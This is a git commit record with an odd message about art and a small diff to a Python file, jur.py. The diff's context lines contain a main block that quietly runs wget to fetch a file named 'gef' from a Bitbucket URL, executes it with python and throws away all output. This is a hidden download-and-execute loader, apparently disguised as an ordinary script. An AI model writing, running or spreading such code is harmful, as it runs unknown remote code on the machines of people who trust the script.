3388cef3be55e5aca95bcb9195a9be79e122be5d
gakira munshi <gakimarki@proton.me>
2024-12-20 21:13:14 -0500

    I will not apologize for art.

--- jur.py
+++ jur.py
@@ -1,3 +1,3 @@
-import os, sys,math
+import os, sys,venv
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
